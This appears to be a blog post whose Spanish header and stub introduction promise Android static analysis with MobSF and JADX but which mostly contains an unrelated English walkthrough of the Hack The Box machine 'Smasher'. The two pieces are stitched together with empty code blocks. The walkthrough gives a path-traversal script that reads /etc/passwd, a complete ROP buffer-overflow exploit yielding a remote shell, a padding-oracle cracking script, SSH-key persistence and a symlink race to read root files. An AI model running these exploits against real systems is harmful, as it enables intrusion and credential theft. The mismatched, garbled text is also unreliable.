---
layout: single
title: Analisis estatico - Android
date: 2023-11-13
classes: wide
header:
  #teaser: /assets/images/Estatico-Android/rootME.jpg
categories:
  - Static Analysis
  - Android Hacking
  - Mobile
tags:
  - Analysis
  - MobSF
  - JADX
  - APK Tool  
---

## Static analysis of android applications

![](/assets/images/Estatico-Android/android-phone-root.jpg)

Esta publicación cubrira la primer parte de las auditorias mobiles, la cual es el analisis dinamico de una sobre un APK.

### Resumen

- Extraer APK del dispotivo.
- Analisis estatico automatico con MOBSF.
- Analisis estatico manual con JADX.
- Apktool.

### Tools used

- [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)
- [JADX](https://github.com/skylot/jadx/releases/download/v1.4.7/jadx-gui-1.4.7-no-jre-win.exe)
- [Apktool](https://github.com/iBotPeaches/Apktool)

### Extraer el APK desde un dispositivo fisico

### MobSF

Nos dirigimos a nuestra maquina Linux, en mi caso sera `Kali Linux` y necesitaremos clonar el repositorio de MobSF con el siguiente comando `git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git`.

```

```

Luego de clonar el repositorio, necesitaremos montar un contenedor de docker con la herramienta para hacer uso de todos los recursos que MobSF necesita, utilizaremos el comando: `docker pull opensecurity/mobile-security-framework-mobsf:latest`, para este punto tendremos que tenes instalado docker en nuestra maquina linux:

```                                                                                                                                                               
┌──(T1N0㉿kali)-[~/Documents/mobile]
└─$ ls   
Mobile-Security-Framework-MobSF                                                                                                                                                                         
┌──(T1N0㉿kali)-[~/Documents/mobile]
└─$ 

```

### Web service

Based on the banner, we know the website is running using the [tiny-web-server](https://github.com/shenfeng/tiny-web-server) server application.

There's already an [issue](https://github.com/shenfeng/tiny-web-server/issues/2) documented for this application about a path traversal vulnerability.

We can walk the file system by doing a `GET ../../../../<file>`, and it also works for directories so we can get a directory listing.

I wrote a small python script to fix the output and sort the results to make it easier to work with:

```python
#!/usr/bin/python

from pwn import *
import sys
import requests

context.log_level = 'info'

ls = []

r = requests.get('http://10.10.10.89:1111/../../../../../%s' % (sys.argv[1]))
if '<tr>' in r.text:
    for line in r.text.splitlines():
        if '<tr>' in line:
            # print(line.split('"')[1])
            ls.append(line.split('"')[1])
    for i in (sorted(ls)):
        print(i)
else:
    print r.text
```

We find the list of users in `/etc/passwd`

```
root@kali:~/hackthebox/Machines/Smasher# python scanner.py /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
www:x:1000:1000:www,,,:/home/www:/bin/bash
smasher:x:1001:1001:,,,:/home/smasher:/bin/bash
```

`www` and `smasher` home directories are probably where we want to look next:

We can't read the home directory of `smasher`:

```
root@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/smasher
File not found
```

But we can read what's in `www`:

```
root@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/www
.bash_logout
.bashrc
.cache/
.profile
.python_history
.ssh/
restart.sh
tiny-web-server/
```

Inside the web server directory, we can see that the Makefile has been modified to disable the stack protector and DEP/NX. This is our hint that we are probably looking at a buffer overflow exploit to get user access on this machine.

```
root@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/www/tiny-web-server
.git/
Makefile
README.md
public_html/
tiny
tiny.c

root@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/www/tiny-web-server/Makefile
CC = c99
CFLAGS = -Wall -O2

# LIB = -lpthread

all: tiny

tiny: tiny.c
    $(CC) $(CFLAGS) -g -fno-stack-protector -z execstack -o tiny tiny.c $(LIB)

clean:
    rm -f *.o tiny *~
```

Next, we'll grab the binary file and check if it's compiled with additional protections:

```
oot@kali:~/hackthebox/Machines/Smasher# nc -nv 10.10.10.89 1111 > tiny
(UNKNOWN) [10.10.10.89] 1111 (?) open
GET ../../../../home/www/tiny-web-server/tiny
```

We edit the file with vi and strip the HTTP headers, then we get a clean ELF file:

```
root@kali:~/hackthebox/Machines/Smasher# file tiny
tiny: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b872377623aa9e081bc7d72c8dbe882f03bf66b7, with debug_info, not stripped

root@kali:~/hackthebox/Machines/Smasher# checksec tiny
[*] '/root/hackthebox/Machines/Smasher/tiny'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
    FORTIFY:  Enabled
```

### Buffer overflow

There's an overflow in the GET parameter: if we send more than 568 characters in the GET request it'll crash. Because we have the binary and we can look around the file system we can:

- Check the PLT/GOT offsets in the binary
- Determine the libc version running on the target system

To find the libc base address, we'll construct a rop chain and use the `read` function already present in the PLT. By chance, the `RDX` register is already set to a large value so we don't need to find a gadget to mess with it. The binary contains `POP RDI` and `POP RSI` gadgets so we can pass the right parameters to the `read` function and dump a chunk of memory.

Calculating the libc address is a matter of fetching the `read` address from the GOT, then substracting its offset (which we know because we have the libc version). After, we'll calculate the memory address for `system`, `dup2` and the `/bin/sh` string.

We need to build a ROP chain that calls `dup2` first so we can redirect stdin and stdout to the socket.

The final exploit is:

```python
#!/usr/bin/python

from pwn import *

import urllib
import sys

r = remote('10.10.10.89', 1111)

fd = 4
offset = 568
junk = p64(0xAABBAABBAABBAABB)

plt_read = p64(0x400cf0)
plt_write = p64(0x400c50)
poprdi = p64(0x4011dd)
poprsi = p64(0x4011db)

payload_stage1 = ''
payload_stage1 += 'A' * offset
payload_stage1 += poprdi + p64(fd)
payload_stage1 += poprsi + p64(0x603088) + junk
payload_stage1 += plt_write

r.send('GET /%s\n\n' % urllib.quote(payload_stage1))
buf = r.recv().split('File not found')[1][0:8]
read_addr = u64(buf)
libc_base = read_addr - 0xf7250    # https://libc.blukat.me/?q=_rtld_global%3A0&l=libc6_2.23-0ubuntu10_amd64
system_addr = libc_base + 0x45390
str_bin_sh = libc_base + 0x18cd57
dup2 = libc_base + 0xf7970

log.info('libc base address is: %s' % hex(libc_base))
log.info('read address is : %s' % hex(read_addr))
log.info('system address is: %s' % hex(system_addr))
log.info('dup2 address is: %s' % hex(dup2))
log.info('/bin/sh address is: %s' % hex(str_bin_sh))

r2 = remote('10.10.10.89', 1111)
payload_stage2 = ''
payload_stage2 += 'A' * offset
payload_stage2 += poprdi + p64(fd)
payload_stage2 += poprsi + p64(0x0) + junk
payload_stage2 += p64(dup2)
payload_stage2 += poprdi + p64(fd)
payload_stage2 += poprsi + p64(0x1) + junk
payload_stage2 += p64(dup2)
payload_stage2 += poprdi + p64(str_bin_sh)
payload_stage2 += p64(system_addr)

r2.send('GET /%s\n\n' % urllib.quote(payload_stage2))
r2.recvuntil('File not found')
r2.interactive()
```

The exploit in action:

```
root@kali:~/hackthebox/Machines/Smasher# python exploit.py 
[+] Opening connection to 10.10.10.89 on port 1111: Done
[*] libc base address is: 0x7f561f10e000
[*] read address is : 0x7f561f205250
[*] system address is: 0x7f561f153390
[*] dup2 address is: 0x7f561f205970
[*] /bin/sh address is: 0x7f561f29ad57
[+] Opening connection to 10.10.10.89 on port 1111: Done
[*] Switching to interactive mode
$ id
uid=1000(www) gid=1000(www) groups=1000(www)
```

After getting that shell, we can add our SSH public key to `/home/www/.ssh/authorized_keys` so we can log in directly without using the exploit.

```
root@kali:~# ssh www@10.10.10.89
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Tue Jun 12 01:34:47 2018 from 10.10.14.23
```
### Oracle padding

There's a hidden service runnning on port 1337 which prompts for a ciphertext string:

```
www@smasher:~$ netstat -panut |more
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:1111            0.0.0.0:*               LISTEN      29166/tiny      
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:1338            0.0.0.0:*               LISTEN      8562/socat      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```

```
www@smasher:~$ nc 127.0.0.1 1337
[*] Welcome to AES Checker! (type 'exit' to quit)
[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
Insert ciphertext: test
Generic error, ignore me!
```

This looks like a challenge which can be solved through an Oracle Padding attack.

To solve this we'll modify the following script: [https://github.com/twd2/padding-oracle-attack/blob/master/attack.py](https://github.com/twd2/padding-oracle-attack/blob/master/attack.py)

Note: latest version of pwntools needs to be installed for Python3 in order for this to work: `pip3 install --upgrade git+https://github.com/arthaud/python3-pwntools.git`

```python
import sys
import time
import urllib
import urllib.parse
import urllib.request
import random
import argparse
import binascii
from pwn import *
import base64

def api(data):
  print(data)
  r = remote("10.10.10.89",1338,level='warn')
  r.recvuntil("Insert ciphertext: ")

  r.sendline(base64.b64encode(binascii.unhexlify(data)))
  print(base64.b64encode(binascii.unhexlify(data)))
  tmp = r.recvuntil('Insert ciphertext:').decode("utf-8")
  r.close()
  if 'OK!' in tmp:
    return True
  if 'Invalid' in tmp:
    return False


def is_valid(iv, c):
  # Test if the padding of (iv ^ c^(-1)) is valid.
  data = binascii.hexlify(bytearray(iv)).decode() + binascii.hexlify(bytearray(c)).decode()
  # print(data)
  return api(data)

def attack(data, block_id, is_valid):
  if 16 * block_id + 32 > len(data):
    print('Block id is too large.')
    exit(1)
  c_p = list(data[16 * block_id:16 * block_id + 16]) # Previous cipher block
  iv = [random.choice(range(256)) for i in range(0, 16)] # *Random* initialization vector is necessary.
  c = data[16 * block_id + 16:16 * block_id + 32] # Current cipher block
  
  plain = []
  for n in range(1, 17): # Which byte (in reverse order)?
    for i in range(0, 256): # All possibilities of iv[-n]
      iv[-n] = i
      if is_valid(iv, c): # Padding is valid, so (iv[-n] ^ c^(-1)[-n]) is n, (iv[-n] ^ n) is c^(-1)[-n].
        break
    # print(iv[-n] ^ n ^ c_p[-n], chr(iv[-n] ^ n ^ c_p[-n])) 
    # Calculate plain text.
    # Note: (iv[-n] ^ n) is c^(-1)[-n], so ((iv[-n] ^ n) ^ c_p[-n]) == (c^(-1)[-n] ^ c_p[-n]) is (plain text)[-n].
    plain.append(iv[-n] ^ n ^ c_p[-n])
    for i in range(1, n + 1):
      iv[-i] = iv[-i] ^ n ^ (n + 1)
      # Note:
      # For futher attack,
      # For i in [1, n], we want (new iv[-i] ^ c^(-1)[-i]) to be (n + 1), so that we can attack c^(-1)[-(n + 1)] using padding oracle.
      # In particular, for i == n, we want (new iv[-n] ^ c^(-1)[-n]) to be (n + 1), so new iv[-n] should be (c^(-1)[-n] ^ (n + 1)) == ((iv[-n] ^ n) ^ (n + 1)).
      # In particular, for i in [1, n - 1], we want (new iv[-i] ^ c^(-1)[-i]) to be (n + 1). Please note that (iv[-i] ^ c^(-1)[-i]) is n, so new iv[-i] should be (c^(-1)[-i] ^ (n + 1)) == ((iv[-i] ^ n) ^ (n + 1))
  plain.reverse()
  return bytearray(plain)

def main():
  # Data from http://10.60.0.212:5757/generate
  #data_hex = '74b6510402f53b1661b98a2cfee1f1b5d65753e5ca0ccb1356c0ef871a0118bc47c245dcb51dc51efd473e5f63f3a8c94818195d08d01e740f27d07b0893d0cd'
  data_hex = '8ab466581ee825231bb410b842ea01d770c2d3c348d3a31b71610e73de2ad0e5cf6df8119be97dc4790f43bafb35d163a3a852a3ab6882a2d8213186a4fb1776'
  data = binascii.unhexlify(data_hex)
  for i in range(0, 3):
    print(attack(data, i, is_valid).decode(), end='')

if __name__ == '__main__':
  main()
```

We can redirect to the local 1337 port using socat: `socat tcp-listen:1338,reuseaddr,fork tcp:localhost:1337`

Then we'll launch the script against port 1338 and let it run for a bit:

```
python3 oracler.py > oracler_output.txt
```

A few lines stand out in the output:

```
b'utEFLXzYEkBmxXPAN4g253DC08NI06MbcWEOc94q0OU='
 user 'smasher' 42eb200bed0f389985bbe43762f1ba00cf6df8119be97dc4790f43bafb35d163
```

```
b'CaH58wii128IH3ksvFujmc9t+BGb6X3EeQ9Duvs10WM='
is: PaddingOraclde1ffb8adbdc35ac24caa42050f32100a3a852a3ab6882a2d8213186a4fb1776
```

```
b'ujCJcv+cH+VbLFWs7SPHdaOoUqOraIKi2CExhqT7F3Y='
eMaster123\x06\x06\x06\x06\x06\x06r
```

By putting this back together we get: `user 'smasher' is: PaddingOracleMaster123`

We can log in with that user and get the first flag:

```
root@kali:~# ssh smasher@10.10.10.89
smasher@10.10.10.89's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Tue Jun 12 01:24:51 2018 from 10.10.16.9
smasher@smasher:~$ id
uid=1001(smasher) gid=1001(smasher) groups=1001(smasher)
smasher@smasher:~$ ls
crackme.py  socat.sh  user.txt

smasher@smasher:~$ cat user.txt
baabc<redacted>
```

### Privesc

There's a SUID file that's interesting:

```
smasher@smasher:~$ find / -perm /6000 2>/dev/null
/usr/bin/checker
```

```
smasher@smasher:~$ checker
[+] Welcome to file UID checker 0.1 by dzonerzy

Missing arguments
```

```
smasher@smasher:~$ file /usr/bin/checker
/usr/bin/checker: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=33890d7446199d25dadc438fce63a78c3f377f95, not stripped
```

There's a race condition in the file because it sleeps for 1 second before reading the file content, so we can exploit this by:

1. Creating a dummy file 'blah' with some junk it
2. Launch /usr/bin/checker against 'blah', then sleep for 0.5 seconds
3. Delete 'blah' and replace it with a symlink to /root/root.txt
4. After the programs comes out of the sleep() function, it'll read root.txt because it's running as root

```
smasher@smasher:~$ rm blah;echo 123 > blah;(/usr/bin/checker blah &);sleep 0.5;rm blah;ln -s /root/root.txt blah
rm: cannot remove 'blah': No such file or directory
[+] Welcome to file UID checker 0.1 by dzonerzy

smasher@smasher:~$ File UID: 1001

Data:
077af<redacted>
```

Flag: `077af<redacted>`